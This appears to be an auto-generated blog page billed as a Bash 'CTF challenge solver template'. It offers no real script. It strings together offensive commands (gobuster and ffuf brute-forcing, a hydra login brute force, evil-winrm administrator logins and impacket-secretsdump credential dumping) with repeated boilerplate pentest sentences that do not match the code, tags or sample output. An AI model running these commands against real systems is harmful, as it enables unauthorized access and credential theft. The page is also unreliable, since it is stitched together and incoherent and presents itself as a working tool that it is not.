---
TitleSEO: "CTF Challenge Solver Template in Bash | ZureFX"
TitlePost: "CTF Challenge Solver Template — Bash"
Author: "ZureFX"
Description: "A Bash script for ctf challenge solver template. Built for security research and automation."
Keywords: "powershell, go, parser, bash"
URL: "https://zurefx.github.io/scripting/script-ctf-challenge-solver-template-167.html"
URL_IMAGES: ""
Date: "2024-07-29"
Tags: "PowerShell, Go, Parser, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-ctf-challenge-solver-template-167"
Permalink: "/scripting/script-ctf-challenge-solver-template-167.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `wmiexec`
- `hashcat`
- `john`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.58.192.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.85.221.46 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.243.3 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.78.243.130/FUZZ
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.101.91.159 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
gobuster dir -u http://10.74.67.49/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.181.25
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 1.65s
```
